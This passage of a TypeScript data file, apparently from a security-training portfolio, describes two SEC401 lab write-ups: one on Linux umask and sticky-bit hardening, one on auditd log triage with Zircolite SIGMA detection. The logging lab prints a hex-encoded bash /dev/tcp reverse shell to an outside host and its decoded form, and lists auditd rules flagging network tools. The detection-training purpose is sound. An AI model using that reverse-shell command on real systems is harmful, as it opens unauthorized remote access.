        command: "umask 0027\necho annika > secure.txt\nmkdir secure_dir\nls -ld secure*",
        commandBreakdown: "umask 0027: mask bits = user 0, group 2, other 7\nEffect: files default to 640, dirs to 750",
        screenshot: "/labs/linux-perms-113302.png",
      },
      {
        title: "Sticky bit on /tmp",
        description:
          "Listed /tmp with ls -ld: drwxrwxrwt. The trailing t is the sticky bit — directory is world-writable, but only the file owner (or root) can rename or delete a file inside it. Created /tmp/sticky_bit_test.txt to demonstrate: any user can write to /tmp, but annika's file is protected from deletion by other users in the same container.",
        command: "ls -ld /tmp\necho \"only annika may rename or delete this file\" > /tmp/sticky_bit_test.txt\nls -l /tmp/sticky_bit_test.txt",
        commandBreakdown: "drwxrwxrwt: d=dir, rwx (user), rwx (group), rwt (other with sticky)\nt without x would display as T",
        screenshot: "/labs/linux-perms-113804.png",
      },
    ],
    outcome:
      "Walked through the full Linux permission model from first principles: default umask → file mode bits → tightened hardening umask → sticky-bit semantics on a shared directory. End state is a working mental model for why 644/755 is the default, why 640/750 is the hardened baseline, and why /tmp is drwxrwxrwt specifically.",
    nextStepsInProduction:
      "Set umask 0027 (or 0077 for single-tenant hosts) in /etc/login.defs and /etc/profile so it applies to every interactive session. For service accounts, set the umask in the systemd unit's UMask= directive so spawned processes inherit it. Audit existing sensitive paths (/etc, /var/log, /home) for world-readable files that shouldn't be, and confirm every world-writable directory on the filesystem has the sticky bit — find / -perm -0002 -type d ! -perm -1000 is the one-liner to enforce that.",
    securityControlsRelevant: [
      "CIS Linux benchmark: default umask 027",
      "File permission auditing (find -perm)",
      "Sticky bit on world-writable directories",
      "Service-account systemd UMask= hardening",
      "Group-based collaboration without world access",
    ],
    keyFindings: [
      "Default umask in the lab container is 0022, producing 644 files and 755 dirs",
      "umask 0027 produces 640 files and 750 dirs — world access eliminated",
      "/tmp has drwxrwxrwt — world-writable but protected by the sticky bit",
      "Group-readable mode (640) preserves same-group collaboration",
    ],
    takeaway: [
      "umask is the one Linux setting that silently shapes every file created on the system. Most hardening guides start with 027 without explaining why — the why is that 027 is the tightest mask that still permits same-group collaboration, and most systems have a legitimate reason to preserve group access (shared dev team, service account + admin group, etc.). 077 is tighter but breaks those workflows.",
      "The sticky bit is a good reminder that Unix permissions aren't just user/group/other — they're a small set of orthogonal tools, and the sticky bit is the one that makes shared directories safe. /tmp, /var/tmp, /dev/shm all rely on it. Any world-writable directory without the sticky bit is a finding worth chasing, because it means any user can delete or rename another user's files inside it.",
      "The docker-compose lab pattern here is understated but useful. You get a clean, throwaway environment for every permission exercise, no risk of clobbering your host, and the setup script handles the network and container lifecycle. Same pattern scales to reproducing customer bugs or running hostile code — it's the defensive version of the sandbox approach.",
    ],
    screenshots: [
      { src: "/labs/linux-perms-112203.png", alt: "Start lab container", caption: "start_6.1.sh brings up lab-61-permissions-1" },
      { src: "/labs/linux-perms-112213.png", alt: "Connect as annika", caption: "connect.sh drops into annika@container" },
      { src: "/labs/linux-perms-112304.png", alt: "Default umask file", caption: "test_perms.txt → 644 (umask 0022)" },
      { src: "/labs/linux-perms-113116.png", alt: "umask readout", caption: "umask → 0022" },
      { src: "/labs/linux-perms-113302.png", alt: "Tightened umask 0027", caption: "secure.txt 640, secure_dir 750" },
      { src: "/labs/linux-perms-113804.png", alt: "Sticky bit on /tmp", caption: "/tmp drwxrwxrwt + sticky_bit_test.txt" },
    ],
  },
  {
    id: 20,
    courseSlug: "sec401",
    slug: "linux-logging-auditing",
    title: "Lab 6.3 - Linux Logging and Auditing",
    course: "SEC401 - Containers, Linux and Mac Security",
    role: "Solo, Lab",
    focus: "Linux Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots from auditd, aureport, ausearch, and Zircolite SIGMA detection",
    context:
      "This lab walks the full Linux audit pipeline: an auditd rules file that watches recon/suspicious binaries, aureport/ausearch for querying audit.log, decoding a hex-encoded bash reverse shell, and finally running Zircolite with a SIGMA ruleset to surface 177 Webshell Remote Command Execution events from the same audit log.",
    summary:
      "Reviewed a Best-Practice auditd rules file (recon + susp_activity + sssd watches), ran aureport --summary to see 28 failed logins / 41020 events / 17 keys, used ausearch -k with -i for interpreted fields, decoded a hex-payload reverse shell to host.docker.internal:3869, and used Zircolite with alpha_rules_linux.json to detect a critical Webshell RCE pattern (177 events).",
    whyThisMatters:
      "Linux log triage is the #2 most-reported CyberLive skill on GSEC. Knowing aureport/ausearch flags by reflex — especially -k for keyed watches and -i for interpreted output — is the difference between answering a Linux forensics question in 30 seconds vs. burning 5 minutes on syntax.",
    tldr: [
      "auditd rules file watches recon (whoami/id/uname), suspicious binaries (nc/nmap/tcpdump/wget), and sssd execve",
      "aureport --summary + aureport --key --summary are the one-command triage views",
      "ausearch -k <key> -i retrieves keyed events with UIDs and timestamps resolved",
      "Zircolite with SIGMA rules found 177 Webshell RCE events in the same audit.log",
    ],
    skillsDemonstrated: [
      "Linux auditd rule authoring (-w / -a / -k / -F)",
      "aureport / ausearch log triage",
      "Decoding hex-encoded attacker payloads",
      "SIGMA ruleset execution with Zircolite",
      "MITRE ATT&CK mapping via SIGMA tags",
    ],
    tools: ["auditd", "aureport", "ausearch", "Zircolite", "SIGMA", "xxd", "gedit"],
    steps: [
      "Open /etc/audit/audit.rules (Florian Roth Best-Practice template) in gedit",
      "Review recon / susp_activity / sssd watch syntax",
      "aureport --summary for high-level event counts",
      "aureport --key --summary for keyed-rule breakdown",
      "xxd -r -p to decode a hex-encoded reverse shell payload",
      "ausearch --input audit.log -k sbin_susp",
      "ausearch -i to resolve UIDs and timestamps in-place",
      "zircolite --events audit.log --ruleset alpha_rules_linux.json --audit",
      "Review detected_events.json for SIGMA hits",
    ],
    stepDetails: [
      {
        title: "Open the auditd rules file",
        description:
          "Opened /sec401/labs/6.3/audit.rules with gedit — Florian Roth's Best-Practice auditd rules file, based on gov.uk auditd, CentOS 7 hardening, and linux-audit.com tuning guides.",
        command: "cd /sec401/labs/6.3\ngedit audit.rules &",
        screenshot: "/labs/linux-logging-124638.png",
      },
      {
        title: "Review recon / susp_activity / sssd rules",
        description:
          "Core audit patterns: -w <path> -p x -k <key> watches binaries for execution. Recon watches cover whoami, id, hostname, uname, /etc/issue. susp_activity covers wget, curl, base64, nc, netcat, ncat, ss, netstat, ssh, scp, sftp, ftp, socat, wireshark, tshark, rdesktop, xfreerdp, nmap. sssd block uses -a always,exit -F path=... -F perm=x -F auid>=500 to audit only real-user exec (auid>=500 excludes system accounts).",
        command: "# syntax shown:\n-w /usr/bin/whoami -p x -k recon\n-w /usr/bin/nc -p x -k susp_activity\n-a always,exit -F path=/usr/libexec/sssd/p11_child -F perm=x -F auid>=500 -F auid!=4294967295 -k T1078_Valid_Accounts",
        commandBreakdown: "-w: watch a path\n-p x: on execute (r/w/a/x for read/write/attr/exec)\n-k: key name (aureport/ausearch filter)\n-a always,exit: rule fires on syscall exit\n-F: field filter (perm, path, auid)\nauid!=4294967295: exclude unset audit UID",
        screenshot: "/labs/linux-logging-124837.png",
      },
      {
        title: "aureport --summary",
        description:
          "aureport --input ./audit.log --summary — high-level triage view of a captured audit log. 41020 events, 28 failed logins, 13 failed authentications, 72 commands, 50 executables, 83 files, 1544 failed syscalls, 17 keys, 21518 process IDs. Range Sep 28 2023 20:56 → Sep 29 14:23. This is the one-liner you run first to size the investigation.",
        command: "aureport --input ./audit.log --summary",
        commandBreakdown: "--input: read from a file instead of /var/log/audit/audit.log\n--summary: one-screen overview",
        screenshot: "/labs/linux-logging-124927.png",
      },
      {
        title: "aureport --key --summary",
        description:
          "Key-based breakdown of which audit rules fired most. network_socket_created 21638, detect_execve_www 14588, 'remote_shell' 3029, network_connect_4 880, susp_shell 162, etcpasswd 55, software_mgmt 37, network_connect_6 25, recon 24, session 21, systemd 16, Data_Compressed 8, specialfiles 7, susp_activity 4, string_search 2, anon_file_create 2, sbin_susp 1. This collapses 41k events into 17 focus areas.",
        command: "aureport --input audit.log --key --summary",
        screenshot: "/labs/linux-logging-125059.png",
      },
      {
        title: "Decode a hex-encoded reverse shell",
        description:
          "One of the audit events contained a hex-encoded command. Piped the hex string through xxd -r -p to decode: /usr/bin/bash -c (echo </dev/tcp/host.docker.internal/3869) 2>/dev/null — a classic bash /dev/tcp reverse shell testing an open port. Decoding hex-obfuscated payloads is a standard CyberLive skill.",
        command: "echo -n 2F7573722F62696E2F62617368002D6300286563686F203C2F6465762F7463702F686F73742E646F636B65722E696E7465726E616C2F333836392920323E2F6465762F6E756C6C2026 | xxd -r -p ; echo",
        commandBreakdown: "xxd -r -p: reverse hex to bytes, plain format (no line numbers)\n-n on echo: no trailing newline",
        screenshot: "/labs/linux-logging-125603.png",
      },
      {
        title: "ausearch by key",
        description:
          "ausearch --input audit.log -k sbin_susp — pulls every event with key sbin_susp. Output is the raw audit format: PROCTITLE, PATH, EXECVE, SYSCALL. Shows uid=33 (www-data) invoking /usr/sbin/tcpdump — the web server user spawning a packet sniffer, which is the whole point of the sbin_susp key.",
        command: "ausearch --input audit.log -k sbin_susp",
        commandBreakdown: "-k: filter by key (same name you set in the -k rule field)",
        screenshot: "/labs/linux-logging-125730.png",
      },
      {
        title: "ausearch -i for interpreted output",
        description:
          "Same query with -i. Now UIDs render as usernames (www-data instead of 33), timestamps render as human-readable (09/28/2023 20:56:15.474 instead of the 1695934575.474 unix timestamp), and arch shows x86_64. -i is the one flag that makes ausearch output actually readable under exam time pressure.",
        command: "ausearch --input audit.log -k sbin_susp -i",
        commandBreakdown: "-i: interpret numeric fields (uid/gid → name, epoch → date, syscall numbers → names)",
        screenshot: "/labs/linux-logging-125803.png",
      },
      {
        title: "Zircolite: SIGMA over audit.log",
        description:
          "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit — runs 169 SIGMA detection rules against the audit log. Finished in 13 seconds. Two hits: Webshell Remote Command Execution [critical] → 177 events, System Information Discovery - Auditd [low] → 11 events. Zircolite is the 'one command turns raw audit.log into SIEM-style alerts' tool.",
        command: "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit",
        commandBreakdown: "--events: input log (audit.log, evtx, sysmon)\n--ruleset: compiled SIGMA JSON\n--audit: tells Zircolite this is Linux auditd format",
        screenshot: "/labs/linux-logging-125927.png",
      },
      {
        title: "Review detected_events.json",
        description:
          "Zircolite wrote detected_events.json: title 'Webshell Remote Command Execution', id c0d3734d-330f-4a03-aae2-65dacc6a8222, rule_level critical, tags attack.persistence + attack.t1505.003, count 177. The underlying SIGMA query was SELECT * FROM logs WHERE type='SYSCALL' AND syscall='59' AND exe='/usr/bin/dash' — execve of dash by the web server, which is the webshell signature.",
        command: "gedit detected_events.json &",
        screenshot: "/labs/linux-logging-130206.png",
      },
    ],
    outcome:
      "Demonstrated the full Linux detection pipeline from auditd rules → aureport/ausearch triage → hex-payload decode → SIGMA detection with Zircolite. End state: 41k events narrowed to 177 Webshell RCE alerts with MITRE ATT&CK T1505.003 mapping, all from standard Linux tooling.",
    nextStepsInProduction:
      "Ship audit.log into the SIEM (Splunk, Elastic) with key-based field extraction so analysts can pivot by recon / susp_activity / remote_shell without running ausearch on every host. Deploy Zircolite as a cron to produce detected_events.json per-host and forward the critical-rule hits into the ticketing system. Expand the rules file with MITRE-mapped keys (T1059, T1071, T1087) so every audit rule carries its own ATT&CK tag.",
    securityControlsRelevant: [
      "auditd with Best-Practice rules (Florian Roth template)",
      "aureport / ausearch for incident triage",
      "SIGMA rulesets + Zircolite for log → detection pipeline",
      "MITRE ATT&CK tagging on audit rule keys",
      "auid>=500 filter to exclude system-account noise",
    ],
    keyFindings: [
      "41020 audit events across Sep 28-29 2023 window",
      "28 failed logins + 13 failed authentications in the same window",
      "sbin_susp key: www-data (uid=33) spawning /usr/sbin/tcpdump",
      "Hex-decoded payload: bash /dev/tcp reverse shell to host.docker.internal:3869",
      "Zircolite SIGMA: 177 Webshell Remote Command Execution events (T1505.003 critical)",
    ],
    takeaway: [
      "The -k flag is the whole game with auditd. Without keys every rule blurs into one undifferentiated stream; with keys you get a tagged index (aureport --key --summary) that lets you pivot by attacker behavior instead of by syscall. Any production audit rule without a meaningful -k value is a rule that won't get queried.",
      "ausearch -i is the flag people forget under time pressure. Numeric UIDs and epoch timestamps are unreadable in a 5-minute CyberLive window. Train the muscle memory: ausearch -k <key> -i, always.",
      "Zircolite over audit.log is the shape of modern Linux detection. You keep auditd's low-level coverage but bolt on SIGMA's community detection library and MITRE mapping. That's the difference between 'I have logs' and 'I have alerts' — and it's the answer to the inevitable audit finding that ships every SEC401 graduate into blue-team work.",
    ],
    screenshots: [
      { src: "/labs/linux-logging-124638.png", alt: "Open audit.rules", caption: "gedit audit.rules & — Best-Practice template" },
      { src: "/labs/linux-logging-124837.png", alt: "audit.rules content", caption: "recon + susp_activity + sssd watch rules" },
      { src: "/labs/linux-logging-124927.png", alt: "aureport --summary", caption: "41020 events, 28 failed logins, 17 keys" },
      { src: "/labs/linux-logging-125059.png", alt: "aureport --key --summary", caption: "Top keys: network_socket_created 21638, detect_execve_www 14588" },
      { src: "/labs/linux-logging-125603.png", alt: "xxd hex decode", caption: "Hex → bash /dev/tcp reverse shell to :3869" },
      { src: "/labs/linux-logging-125730.png", alt: "ausearch -k sbin_susp", caption: "www-data spawning /usr/sbin/tcpdump" },
      { src: "/labs/linux-logging-125803.png", alt: "ausearch -i interpreted", caption: "UIDs → names, epoch → human timestamps" },
      { src: "/labs/linux-logging-125927.png", alt: "Zircolite SIGMA run", caption: "169 rules → Webshell RCE critical (177 events)" },
      { src: "/labs/linux-logging-130206.png", alt: "detected_events.json", caption: "T1505.003, syscall=59, exe=/usr/bin/dash" },
    ],
  },
];

export function getLabByCourseAndSlug(courseSlug: string, slug: string): CybersecurityLab | undefined {
  return LABS.find((l) => l.courseSlug === courseSlug && l.slug === slug);
}

export function getLabPath(lab: CybersecurityLab): string {
  return `/labs/${lab.courseSlug}/${lab.slug}`;
}

/** For redirects from legacy flat URLs */
export function getLabByLegacySlug(legacySlug: string): CybersecurityLab | undefined {
  return LABS.find((l) => l.legacySlug === legacySlug);
}

export function getLabBySlug(slug: string): CybersecurityLab | undefined {
  return LABS.find((l) => l.slug === slug || l.legacySlug === slug);
}
